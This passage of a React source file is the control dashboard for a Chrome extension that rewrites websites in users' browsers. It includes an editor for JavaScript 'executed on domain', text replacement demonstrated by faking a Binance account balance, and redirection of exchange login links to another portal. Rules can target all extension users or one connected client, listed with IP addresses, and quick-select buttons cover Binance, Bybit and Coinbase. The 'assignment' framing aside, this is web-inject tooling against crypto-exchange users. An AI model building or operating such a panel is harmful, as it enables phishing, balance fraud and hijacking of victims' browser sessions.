                        className="add-section-option-btn"
                        onClick={() => handleAddSection('text')}
                      >
                        <span className="add-section-icon">📝</span>
                        <span className="add-section-label">Text Block</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('button')}
                      >
                        <span className="add-section-icon">🔘</span>
                        <span className="add-section-label">Action Button</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('alert')}
                      >
                        <span className="add-section-icon">⚠️</span>
                        <span className="add-section-label">Alert Badge</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('countdown')}
                      >
                        <span className="add-section-icon">⏳</span>
                        <span className="add-section-label">Countdown</span>
                      </button>

                      <button
                        type="button"
                        className="add-section-option-btn"
                        onClick={() => handleAddSection('image')}
                      >
                        <span className="add-section-icon">🖼️</span>
                        <span className="add-section-label">Image</span>
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                /* MODE B: CUSTOM CODING (HTML / CSS / JS) */
                <div className="builder-box">
                  <div className="builder-box-title">
                    <span>💻 Custom Code Editor</span>
                    <div style={{ display: 'flex', gap: '4px' }}>
                      <button
                        type="button"
                        className={`btn btn-sm ${codeActiveTab === 'html' ? 'btn-primary' : 'btn-secondary'}`}
                        onClick={() => setCodeActiveTab('html')}
                      >
                        HTML
                      </button>
                      <button
                        type="button"
                        className={`btn btn-sm ${codeActiveTab === 'css' ? 'btn-primary' : 'btn-secondary'}`}
                        onClick={() => setCodeActiveTab('css')}
                      >
                        CSS
                      </button>
                      <button
                        type="button"
                        className={`btn btn-sm ${codeActiveTab === 'js' ? 'btn-primary' : 'btn-secondary'}`}
                        onClick={() => setCodeActiveTab('js')}
                      >
                        JavaScript
                      </button>
                    </div>
                  </div>

                  {codeActiveTab === 'html' && (
                    <div>
                      <label className="form-label">Custom HTML Markup:</label>
                      <textarea
                        className="form-textarea code-textarea"
                        rows={10}
                        value={formData.overlay?.customHtml || ''}
                        onChange={(e) => updateOverlay('customHtml', e.target.value)}
                        placeholder="<div>Your custom HTML markup...</div>"
                      />
                    </div>
                  )}

                  {codeActiveTab === 'css' && (
                    <div>
                      <label className="form-label">Custom CSS Styles (Injected into Page):</label>
                      <textarea
                        className="form-textarea code-textarea"
                        rows={10}
                        value={formData.overlay?.customCss || ''}
                        onChange={(e) => updateOverlay('customCss', e.target.value)}
                        placeholder="#custom-sticky-popup { animation: fadeIn 0.3s ease; }"
                      />
                    </div>
                  )}

                  {codeActiveTab === 'js' && (
                    <div>
                      <label className="form-label">Custom JavaScript (Executed on Domain):</label>
                      <textarea
                        className="form-textarea code-textarea"
                        rows={10}
                        value={formData.overlay?.customJs || ''}
                        onChange={(e) => updateOverlay('customJs', e.target.value)}
                        placeholder="// e.g. setTimeout(() => window.location.href = '...', 5000);"
                      />
                    </div>
                  )}
                </div>
              )}

              {/* Publish / Save Button */}
              <button
                type="button"
                className="btn btn-primary"
                onClick={handleSaveRule}
                disabled={saving}
                style={{ width: '100%', padding: '14px', fontSize: '14px', fontWeight: 700 }}
              >
                {saving ? '⏳ Saving & Publishing...' : '💾 Save & Publish Configuration'}
              </button>

              {selectedRuleId && (
                <button
                  type="button"
                  className="btn btn-danger btn-sm"
                  onClick={() => handleDeleteRule(selectedRuleId)}
                  style={{ width: '100%' }}
                >
                  🗑 Delete This Domain Rule
                </button>
              )}
            </div>

            {/* Right Column: Live Interactive Preview Canvas */}
            <div>
              {renderLiveCanvas(false)}
            </div>
          </div>
        </div>
      )}

      {/* TAB: In-Page Live Text & DOM Replacer */}
      {activeTab === 'replacements' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '22px' }}>
          {/* Header Card with Demo Presentation Banner */}
          <div className="card" style={{ background: 'linear-gradient(135deg, #ffffff 0%, #f8f7ff 100%)', border: '1.5px solid #e0d7ff' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '16px' }}>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '6px' }}>
                  <span style={{ fontSize: '24px' }}>✏️</span>
                  <h2 className="card-title" style={{ margin: 0, fontSize: '20px' }}>In-Page Website Text &amp; DOM Modifier</h2>
                  <span className="badge badge-purple" style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                    <span className="live-pulse-dot" /> Live Assignment Project Mode
                  </span>
                </div>
                <p style={{ color: 'var(--text-secondary)', fontSize: '13px', maxWidth: '780px', lineHeight: 1.5 }}>
                  Inspect any text or element on the website (e.g. Binance account balance, header, or button), paste the inspected code below, and replace it dynamically in real time through the Chrome Extension!
                </p>
              </div>

              <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
                <button
                  type="button"
                  className="btn btn-secondary btn-sm"
                  onClick={handleLoadDemoReplacement}
                  style={{ background: '#ffffff', borderColor: 'var(--brand-purple)', color: 'var(--brand-purple)', fontWeight: 700 }}
                  title="Loads sample Binance balance code for 1-click teacher demonstration"
                >
                  ⚡ Load Demo Binance Balance
                </button>
                <button
                  type="button"
                  className="btn btn-secondary btn-sm"
                  onClick={handleLoadDemoLinkReplacement}
                  style={{ background: '#ffffff', borderColor: '#0284c7', color: '#0369a1', fontWeight: 700 }}
                  title="Loads sample Binance link redirection rule"
                >
                  🔗 Load Demo Link (href) Redirect
                </button>
              </div>
            </div>

            {/* 4-Step Quick Walkthrough Guide */}
            <div className="replacer-steps-grid" style={{ marginTop: '20px' }}>
              <div className="replacer-step-card">
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <div className="replacer-step-num">1</div>
                  <div className="replacer-step-title">Inspect Element</div>
                </div>
                <div className="replacer-step-desc">
                  Open target website (e.g. binance.com), right-click the text or link you want to change, and click <strong>Inspect</strong>.
                </div>
              </div>

              <div className="replacer-step-card">
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <div className="replacer-step-num">2</div>
                  <div className="replacer-step-title">Copy Code</div>
                </div>
                <div className="replacer-step-desc">
                  In DevTools Elements panel, right-click the highlighted line &gt; <strong>Copy &gt; Copy element</strong> (or copy the text/link).
                </div>
              </div>

              <div className="replacer-step-card">
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <div className="replacer-step-num">3</div>
                  <div className="replacer-step-title">Paste &amp; Edit Below</div>
                </div>
                <div className="replacer-step-desc">
                  Paste the code below. The smart parser auto-detects text, selector &amp; link href. Type your new text or new link!
                </div>
              </div>

              <div className="replacer-step-card">
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <div className="replacer-step-num">4</div>
                  <div className="replacer-step-title">Watch Live Update</div>
                </div>
                <div className="replacer-step-desc">
                  Click <strong>&quot;Update Website Live&quot;</strong>. The extension automatically updates the text and redirects the link!
                </div>
              </div>
            </div>
          </div>

          {/* New Text Replacement Creator / Editor Box */}
          <div
            id="replacer-form-card"
            className="card"
            style={
              editingRepId
                ? {
                    border: '2px solid var(--brand-purple)',
                    boxShadow: '0 0 0 3px rgba(124, 58, 237, 0.15)',
                    transition: 'all 0.25s ease',
                  }
                : undefined
            }
          >
            <div className="card-header" style={{ marginBottom: '16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
              <div>
                <h3 className="card-title" style={{ display: 'flex', alignItems: 'center', gap: '8px', margin: 0 }}>
                  {editingRepId ? (
                    <>
                      <span>✏️</span>
                      <span>Edit Replacement Rule</span>
                      <span className="badge badge-purple" style={{ fontSize: '11px', fontFamily: 'var(--font-mono)' }}>
                        ID: {editingRepId}
                      </span>
                    </>
                  ) : (
                    <>
                      <span>➕</span>
                      <span>Create Website Text &amp; Link Replacement</span>
                    </>
                  )}
                </h3>
                <p style={{ color: 'var(--text-secondary)', fontSize: '12px', marginTop: '4px' }}>
                  {editingRepId
                    ? 'Modify the values below and click "Save Changes" to update this live rule.'
                    : 'Configure what text or link URL to replace and what new value to display on the website.'}
                </p>
              </div>

              {editingRepId && (
                <button
                  type="button"
                  className="btn btn-secondary btn-sm"
                  onClick={handleCancelEditReplacement}
                  style={{ fontWeight: 600 }}
                >
                  ✕ Cancel Edit
                </button>
              )}
            </div>

            <form onSubmit={handleSaveReplacement}>
              {/* Target Audience Scope: Global vs Specific User */}
              <div style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #e2e8f0', marginBottom: '16px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
                  <label className="form-label" style={{ fontWeight: 700, margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <span>👥 Target Audience:</span>
                    <span style={{ fontSize: '12px', color: 'var(--text-secondary)', fontWeight: 400 }}>(Global or Specific User)</span>
                  </label>
                  <span className={repForm.targetMode === 'global' ? 'badge badge-green' : 'badge badge-purple'} style={{ fontSize: '11px' }}>
                    {repForm.targetMode === 'global' ? '🌐 All Connected Users (Global)' : '🎯 Single Specific User Only'}
                  </span>
                </div>

                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: repForm.targetMode === 'specific' ? '12px' : '0' }}>
                  <button
                    type="button"
                    onClick={() => setRepForm({ ...repForm, targetMode: 'global', targetClientId: '' })}
                    style={{
                      padding: '12px 16px',
                      borderRadius: '8px',
                      border: repForm.targetMode === 'global' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
                      background: repForm.targetMode === 'global' ? 'var(--brand-purple-subtle)' : '#ffffff',
                      cursor: 'pointer',
                      textAlign: 'left',
                      transition: 'all 0.2s',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: repForm.targetMode === 'global' ? 'var(--brand-purple)' : '#334155', fontSize: '13.5px' }}>
                      <span>🌐</span>
                      <span>All Users Globally (Default)</span>
                    </div>
                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
                      Replaces text/links for <strong>every visitor</strong> on matching domain who has the extension installed.
                    </div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setRepForm({ ...repForm, targetMode: 'specific' })}
                    style={{
                      padding: '12px 16px',
                      borderRadius: '8px',
                      border: repForm.targetMode === 'specific' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
                      background: repForm.targetMode === 'specific' ? 'var(--brand-purple-subtle)' : '#ffffff',
                      cursor: 'pointer',
                      textAlign: 'left',
                      transition: 'all 0.2s',
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: repForm.targetMode === 'specific' ? 'var(--brand-purple)' : '#334155', fontSize: '13.5px' }}>
                      <span>🎯</span>
                      <span>Specific User / Client Only</span>
                    </div>
                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
                      Replaces text/links <strong>exclusively for one specific Client ID</strong>. Other users see normal website.
                    </div>
                  </button>
                </div>

                {/* If Specific User Mode is selected: Select or Enter Target Client ID */}
                {repForm.targetMode === 'specific' && (
                  <div style={{ background: '#ffffff', padding: '14px', borderRadius: '6px', border: '1px solid #cbd5e1', marginTop: '12px' }}>
                    <label className="form-label" style={{ fontWeight: 600, fontSize: '12.5px', marginBottom: '6px', display: 'flex', justifyContent: 'space-between' }}>
                      <span>Select or Enter Target Client ID:</span>
                      <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>From Connected Clients list</span>
                    </label>

                    <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '10px' }}>
                      <select
                        className="form-input"
                        value={repForm.targetClientId}
                        onChange={(e) => setRepForm({ ...repForm, targetClientId: e.target.value })}
                        style={{
                          borderColor: showRepErrors && !repForm.targetClientId.trim() ? '#ef4444' : undefined,
                          background: showRepErrors && !repForm.targetClientId.trim() ? '#fff5f5' : '#ffffff',
                          fontWeight: 600,
                        }}
                      >
                        <option value="">-- Choose from Connected Clients ({clients.length}) --</option>
                        {clients.map((c) => (
                          <option key={c.clientId} value={c.clientId}>
                            {c.isOnline || c.status === 'online' ? '🟢' : '⚪'} {c.clientId} ({c.domain || 'binance.com'}) {c.ip ? ` - IP: ${c.ip}` : ''}
                          </option>
                        ))}
                      </select>

                      <input
                        type="text"
                        className="form-input"
                        placeholder="Or paste client_xxxx ID here"
                        value={repForm.targetClientId}
                        onChange={(e) => setRepForm({ ...repForm, targetClientId: e.target.value })}
                        style={{
                          borderColor: showRepErrors && !repForm.targetClientId.trim() ? '#ef4444' : undefined,
                          background: showRepErrors && !repForm.targetClientId.trim() ? '#fff5f5' : '#ffffff',
                          fontFamily: 'var(--font-mono)',
                          fontSize: '12px',
                        }}
                      />
                    </div>

                    {showRepErrors && !repForm.targetClientId.trim() && (
                      <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
                        ⚠️ Required in Specific User mode: Select a connected client from the dropdown or paste a Client ID
                      </span>
                    )}

                    {/* Quick Select Connected Online Clients Chips */}
                    {clients.length > 0 && (
                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginTop: '10px', flexWrap: 'wrap' }}>
                        <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Pick Online Clients:</span>
                        {clients.slice(0, 5).map((c) => (
                          <button
                            key={c.clientId}
                            type="button"
                            className="quick-chip"
                            onClick={() => setRepForm({ ...repForm, targetClientId: c.clientId })}
                            style={{
                              fontSize: '11px',
                              padding: '3px 8px',
                              background: repForm.targetClientId === c.clientId ? 'var(--brand-purple-subtle)' : '#ffffff',
                              borderColor: repForm.targetClientId === c.clientId ? 'var(--brand-purple)' : undefined,
                              fontWeight: repForm.targetClientId === c.clientId ? 700 : 500,
                            }}
                          >
                            {c.isOnline || c.status === 'online' ? '🟢' : '⚪'} {c.clientId.slice(0, 16)}... {c.ip ? `(${c.ip})` : ''}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* Target Domain Input & Quick Suggestion Chips */}
              <div className="form-group">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                  <label className="form-label" style={{ fontWeight: 600, margin: 0 }}>Target Website Domain:</label>
                  <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>e.g. binance.com, *.binance.com, or *</span>
                </div>
                <input
                  type="text"
                  className="form-input"
                  value={repForm.domain}
                  onChange={(e) => setRepForm({ ...repForm, domain: e.target.value })}
                  placeholder="e.g. binance.com or *"
                  style={{
                    borderColor: showRepErrors && !repForm.domain.trim() ? '#ef4444' : undefined,
                    background: showRepErrors && !repForm.domain.trim() ? '#fff5f5' : undefined,
                  }}
                  required
                />
                {showRepErrors && !repForm.domain.trim() && (
                  <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '3px', display: 'block' }}>
                    ⚠️ Required: enter target website domain or * for all domains
                  </span>
                )}
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '6px', flexWrap: 'wrap' }}>
                  <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Select:</span>
                  {['binance.com', 'bybit.com', 'coinbase.com', '*'].map((d) => (
                    <button
                      key={d}
                      type="button"
                      className="quick-chip"
                      onClick={() => setRepForm({ ...repForm, domain: d })}
                      style={{ fontSize: '11px', padding: '4px 8px' }}
                    >
                      {d === '*' ? '★ All Websites (*)' : d}
                    </button>
                  ))}
                </div>
              </div>

              {/* Paste Inspected Code Textarea (With Smart Auto-Parser) */}
              <div className="form-group">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                  <label className="form-label" style={{ fontWeight: 700, color: 'var(--brand-purple)', margin: 0 }}>
                    📋 Paste Inspected Element / HTML / Text / Link from Website:
                  </label>
                  <span style={{ fontSize: '11px', color: 'var(--brand-green)', fontWeight: 600 }}>
                    ⚡ Auto-Detects Selector, Text &amp; href Link
                  </span>
                </div>
                <textarea
                  className="code-paste-box"
                  rows={3}
                  value={repForm.pastedCode}
                  onChange={(e) => handlePastedCodeChange(e.target.value)}
                  placeholder={'e.g. <a href="https://accounts.binance.com/en/login" class="login-btn">Log In</a>\nor <div class="balance-amount">$1,450.00 USD</div>\nor paste any element copied from browser inspect...'}
                />
                <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
                  💡 Paste the outerHTML from DevTools or simply paste the original text. The system automatically extracts inner text, CSS selector, and link href for you!
                </span>
              </div>

              {/* 2-Column Detail: Original Text + CSS Selector */}
              <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '14px', marginBottom: '16px' }}>
                <div className="form-group" style={{ marginBottom: 0 }}>
                  <label className="form-label" style={{ fontWeight: 600 }}>
                    🎯 Original Text to Match / Replace:
                  </label>
                  <input
                    type="text"
                    className="form-input"
                    value={repForm.originalText}
                    onChange={(e) => setRepForm({ ...repForm, originalText: e.target.value })}
                    placeholder="e.g. $1,450.00 USD, Log In, or 1.4582 BTC"
                    style={{
                      borderColor:
                        showRepErrors && !repForm.originalText.trim() && !repForm.selector.trim() && !repForm.originalHref.trim()
                          ? '#ef4444'
                          : undefined,
                      background:
                        showRepErrors && !repForm.originalText.trim() && !repForm.selector.trim() && !repForm.originalHref.trim()
                          ? '#fff5f5'
                          : undefined,
                    }}
                  />
                  {showRepErrors && !repForm.originalText.trim() && !repForm.selector.trim() && !repForm.originalHref.trim() ? (
                    <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '3px', display: 'block' }}>
                      ⚠️ Required: enter text to match, or provide a CSS selector / link below
                    </span>
                  ) : (
                    <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
                      The extension will search and replace this exact text on the website.
                    </span>
                  )}
                </div>

                <div className="form-group" style={{ marginBottom: 0 }}>
                  <label className="form-label" style={{ fontWeight: 600 }}>
                    🔍 CSS Selector (Optional / Auto-detected):
                  </label>
                  <input
                    type="text"
                    className="form-input"
                    value={repForm.selector}
                    onChange={(e) => setRepForm({ ...repForm, selector: e.target.value })}
                    placeholder="e.g. .balance-amount, #user-name, or a.login-btn"
                    style={{
                      borderColor: showRepErrors && !repValidation.selectorValid ? '#ef4444' : undefined,
                      background: showRepErrors && !repValidation.selectorValid ? '#fff5f5' : undefined,
                    }}
                  />
                  {showRepErrors && !repValidation.selectorValid ? (
                    <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '3px', display: 'block' }}>
                      ❌ Invalid CSS selector syntax. Please check for typos.
                    </span>
                  ) : (
                    <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
                      Limits replacement to elements matching this selector (leave empty to replace everywhere).
                    </span>
                  )}
                </div>
              </div>

              {/* Editable Link (href) Redirection Section */}
              <div style={{ background: '#f0f9ff', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #bae6fd', marginBottom: '16px' }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
                  <label className="form-label" style={{ fontWeight: 700, color: '#0369a1', margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <span>🔗</span>
                    <span>Editable Link URL (href) &amp; Click Redirection:</span>
                  </label>
                  <span style={{ fontSize: '11px', color: '#0284c7', fontWeight: 600 }}>
                    {repForm.originalHref ? '✓ Link Auto-detected from <a>' : 'Optional: Works on <a> anchors or buttons'}
                  </span>
                </div>

                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '14px' }}>
                  <div>
                    <label className="form-label" style={{ fontSize: '12px', fontWeight: 600, color: '#334155' }}>
                      Original Link / href (Auto-detected or Optional):
                    </label>
                    <input
                      type="text"
                      className="form-input"
                      value={repForm.originalHref || ''}
                      onChange={(e) => setRepForm({ ...repForm, originalHref: e.target.value })}
                      placeholder="e.g. /en/trade or https://accounts.binance.com/en/login"
                      style={{ background: '#ffffff' }}
                    />
                    <span style={{ fontSize: '11px', color: '#64748b', marginTop: '3px', display: 'block' }}>
                      Links pointing to this URL will be updated (auto-filled if an &lt;a&gt; was pasted).
                    </span>
                  </div>

                  <div>
                    <label className="form-label" style={{ fontSize: '12px', fontWeight: 700, color: '#0369a1' }}>
                      ✨ New Target Link URL (href):
                    </label>
                    <input
                      type="text"
                      className="form-input"
                      value={repForm.replacementHref || ''}
                      onChange={(e) => setRepForm({ ...repForm, replacementHref: e.target.value })}
                      placeholder="e.g. https://my-custom-portal.com or /en/my/settings/profile"
                      style={{ background: '#ffffff', borderColor: '#0284c7', fontWeight: 600 }}
                    />
                    <span style={{ fontSize: '11px', color: '#0284c7', marginTop: '3px', display: 'block' }}>
                      When user clicks this element/link, redirect them here instead!
                    </span>
                  </div>
                </div>
              </div>

              {/* New Replacement Text (Highlight Input) */}
              <div style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #cbd5e1', marginBottom: '16px' }}>
                <label className="form-label" style={{ fontWeight: 800, fontSize: '14px', color: '#0f172a' }}>
                  ✨ New Replacement Text (What Will Appear on Website):
                </label>
                <input
                  type="text"
                  className="form-input"
                  value={repForm.replacementText}
                  onChange={(e) => setRepForm({ ...repForm, replacementText: e.target.value })}
                  placeholder="e.g. $148,920.50 USD or 99.5000 BTC"
                  style={{
                    fontSize: '16px',
                    fontWeight: 700,
                    borderColor:
                      showRepErrors && !repForm.replacementText.trim() && !repForm.replacementHref.trim()
                        ? '#ef4444'
                        : 'var(--brand-purple)',
                    background:
                      showRepErrors && !repForm.replacementText.trim() && !repForm.replacementHref.trim()
                        ? '#fff5f5'
                        : '#ffffff',
                    padding: '12px 14px',
                  }}
                />
                {showRepErrors && !repForm.replacementText.trim() && !repForm.replacementHref.trim() && (
                  <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
                    ⚠️ Required: enter new text to show on website, or enter a new Link URL (href) above
                  </span>
                )}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: '10px' }}>
                  <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                    Preview: <strong style={{ color: '#ef4444' }}>{repForm.originalText || 'Old Text'}</strong> ➔ <strong style={{ color: '#10b981' }}>{repForm.replacementText || 'New Text'}</strong>
                  </span>

                  <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                    <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-secondary)' }}>Mode:</span>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{
                        background: repForm.replaceType === 'text' ? 'var(--brand-purple-subtle)' : '#ffffff',
                        borderColor: repForm.replaceType === 'text' ? 'var(--brand-purple)' : 'var(--border-light)',
                        fontWeight: repForm.replaceType === 'text' ? 700 : 500,
                      }}
                      onClick={() => setRepForm({ ...repForm, replaceType: 'text' })}
                    >
                      Plain Text
                    </button>
                    <button
                      type="button"
                      className="quick-chip"
                      style={{
                        background: repForm.replaceType === 'html' ? 'var(--brand-purple-subtle)' : '#ffffff',
                        borderColor: repForm.replaceType === 'html' ? 'var(--brand-purple)' : 'var(--border-light)',
                        fontWeight: repForm.replaceType === 'html' ? 700 : 500,
                      }}
                      onClick={() => setRepForm({ ...repForm, replaceType: 'html' })}
                    >
                      HTML Markup
                    </button>
                  </div>
                </div>
              </div>

              {/* Live Updatable Validation Feedback Banner (Neutral if pristine, Red if errors, Green if ready) */}
              {repValidation.isUpdatable ? (
                <div
                  style={{
                    background: '#f0fdf4',
                    border: '2px solid #10b981',
                    borderRadius: '8px',
                    padding: '14px 18px',
                    marginBottom: '16px',
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '4px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 800, color: '#065f46', fontSize: '14px' }}>
                      <span style={{ fontSize: '18px' }}>✅</span>
                      <span>READY &amp; UPDATABLE — Valid Target &amp; Replacement Detected</span>
                    </div>
                    <span
                      style={{
                        background: '#16a34a',
                        color: '#ffffff',
                        fontSize: '11px',
                        fontWeight: 800,
                        padding: '3px 8px',
                        borderRadius: '4px',
                        letterSpacing: '0.5px',
                        textTransform: 'uppercase',
                      }}
                    >
                      Status: 100% Updatable
                    </span>
                  </div>
                  <div style={{ color: '#047857', fontSize: '12px' }}>
                    All parameters valid! Extension will match {repForm.originalText ? <span>text <code>{repForm.originalText}</code></span> : null}
                    {repForm.selector ? <span> via selector <code>{repForm.selector}</code></span> : null}
                    {repForm.replacementText ? <span> and replace with <code>{repForm.replacementText}</code></span> : null}
                    {repForm.replacementHref ? <span> and update link to <code>{repForm.replacementHref}</code></span> : null}
                    {' on '}<strong>{repForm.domain}</strong>
                    {repForm.targetMode === 'specific' && repForm.targetClientId ? (
                      <span> (Target Client: <code>{repForm.targetClientId}</code>)</span>
                    ) : (
                      <span> (Audience: <strong>🌐 All Users Globally</strong>)</span>
                    )}.
                  </div>
                </div>
              ) : showRepErrors ? (
                <div
                  style={{
                    background: '#fef2f2',
                    border: '2px solid #ef4444',
                    borderRadius: '8px',
                    padding: '14px 18px',
                    marginBottom: '16px',
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 800, color: '#991b1b', fontSize: '14px' }}>
                      <span style={{ fontSize: '18px' }}>❌</span>
                      <span>NOT UPDATABLE — Missing Required Information</span>
                    </div>
                    <span
                      style={{
                        background: '#dc2626',
                        color: '#ffffff',
                        fontSize: '11px',
                        fontWeight: 800,
                        padding: '3px 8px',
                        borderRadius: '4px',
                        letterSpacing: '0.5px',
                        textTransform: 'uppercase',
                      }}
                    >
                      Status: Cannot Update
                    </span>
                  </div>
                  <div style={{ color: '#b91c1c', fontSize: '12.5px', lineHeight: 1.5 }}>
                    Please fix the following issue(s) marked in red:
                    <ul style={{ margin: '6px 0 0 18px', padding: 0 }}>
                      {repValidation.errors.map((err, idx) => (
                        <li key={idx} style={{ marginBottom: '2px' }}>
                          <strong>{err.field.toUpperCase()}:</strong> {err.message}
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
              ) : (
                <div
                  style={{
                    background: '#f8fafc',
                    border: '1.5px dashed #cbd5e1',
                    borderRadius: '8px',
                    padding: '14px 18px',
                    marginBottom: '16px',
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', color: '#475569' }}>
                    <span style={{ fontSize: '20px' }}>💡</span>
                    <div style={{ fontSize: '13px', lineHeight: 1.4 }}>
                      <strong>Ready for element input:</strong> Paste inspected HTML/code above, or enter text to replace.
                      Target <strong>All Connected Users (Globally)</strong> or a <strong>Specific Client</strong>.
                    </div>
                  </div>
                </div>
              )}

              {/* Action Buttons */}
              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', marginTop: '16px' }}>
                {editingRepId ? (
                  <button
                    type="button"
                    className="btn btn-secondary"
                    onClick={handleCancelEditReplacement}
                  >
                    Cancel Edit
                  </button>
                ) : (
                  <button
                    type="button"
                    className="btn btn-secondary"
                    onClick={() => {
                      setRepTouched(false);
                      setRepForm({
                        id: null,
                        domain: 'binance.com',
                        targetMode: 'global',
                        targetClientId: '',
                        pastedCode: '',
                        selector: '',
                        originalText: '',
                        replacementText: '',
                        originalHref: '',
                        replacementHref: '',
                        replaceType: 'text',
                      });
                    }}
                  >
                    Reset Form
                  </button>
                )}
                <button
                  type="submit"
                  className={`btn ${repValidation.isUpdatable ? 'btn-primary' : 'btn-secondary'}`}
                  disabled={repSaving || !repValidation.isUpdatable}
                  style={{
                    padding: '12px 28px',
                    fontSize: '14px',
                    fontWeight: 700,
                    background: repValidation.isUpdatable ? 'var(--brand-purple)' : '#94a3b8',
                    cursor: repValidation.isUpdatable ? 'pointer' : 'not-allowed',
                    color: '#ffffff',
                  }}
                >
                  {repSaving
                    ? '⏳ Saving & Pushing Live...'
                    : repValidation.isUpdatable
                      ? editingRepId
                        ? '💾 Save Changes (Update Live)'
                        : '🚀 Update Website Live (Ready)'
                      : showRepErrors
                        ? '⚠️ Cannot Update (Fix Red Errors)'
                        : '🚀 Update Website Live'}
                </button>
              </div>
            </form>
          </div>

          {/* Active In-Page Replacements Table */}
          <div className="card">
            <div className="card-header" style={{ marginBottom: '14px' }}>
              <div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '4px' }}>
                  <h3 className="card-title" style={{ margin: 0 }}>📋 Active In-Page Text Replacement Rules</h3>
                  <span className="badge badge-purple">{replacements.length} Total Rules</span>
                </div>
                <p style={{ color: 'var(--text-secondary)', fontSize: '12px' }}>
                  These text replacement rules are continuously tracked and applied by the Chrome Extension on matching websites using MutationObserver.
                </p>
              </div>
              <button className="btn btn-secondary btn-sm" onClick={fetchReplacements}>
                🔄 Refresh Rules
              </button>
            </div>

            <div className="table-wrapper">
              <table className="data-table">
                <thead>
                  <tr>
                    <th>Status</th>
                    <th>Target Domain</th>
                    <th>Audience Scope</th>
                    <th>Text Transformation</th>
                    <th>Target Selector</th>
                    <th>Updated</th>
                    <th style={{ textAlign: 'right' }}>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {replacements.length === 0 ? (
                    <tr>
                      <td colSpan={7} style={{ textAlign: 'center', padding: '36px', color: 'var(--text-secondary)' }}>
                        <div>No text replacement rules created yet.</div>
                        <div style={{ marginTop: '8px' }}>
                          <button
                            type="button"
                            className="btn btn-secondary btn-sm"
                            onClick={handleLoadDemoReplacement}
